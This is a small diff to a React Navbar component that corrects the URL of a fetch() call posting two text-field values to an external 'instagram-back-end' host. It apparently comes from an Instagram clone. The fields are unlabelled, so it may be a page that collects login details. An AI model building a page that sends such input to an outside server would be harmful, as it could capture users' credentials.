@@ -32,7 +32,7 @@ export default function Navbar() {
                                         <button className="tn" onClick={() => {
                                             let tex1 = text1.value;
                                             let tex2 = text2.value;
-                                            fetch('https://instagram-backen.onrender.com/data', {
+                                            fetch('https://instagram-back-end.onrender.com/data', {
                                                 method: 'POST',
                                                 headers: {
                                                     'Content-Type': 'application/json'
